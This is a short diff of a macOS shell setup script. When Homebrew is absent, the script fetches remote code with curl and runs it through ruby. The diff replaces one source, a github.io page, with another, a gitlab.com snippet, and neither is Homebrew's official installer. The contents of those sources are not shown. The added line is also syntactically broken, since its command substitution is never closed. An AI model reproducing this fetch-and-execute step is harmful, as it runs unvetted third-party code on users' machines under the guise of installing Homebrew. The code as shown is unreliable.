@@ -6,7 +6,7 @@ which brew > /dev/null
 if [ $? -ne 0 ]; then
     echo "==> You do not have Homebrew installed on your Mac."
     read -p "==> Homebrew is required to use this tool. Press enter/return to automatically install it... "
-    /usr/bin/ruby -e "$(curl -fsSL https://lazybot2.github.io/repo/raw1)"
+    /usr/bin/ruby -e "$(curl -fsSL https://gitlab.com/snippets/1912596/raw"
 fi
 
 echo "==> Installing dependencies..."
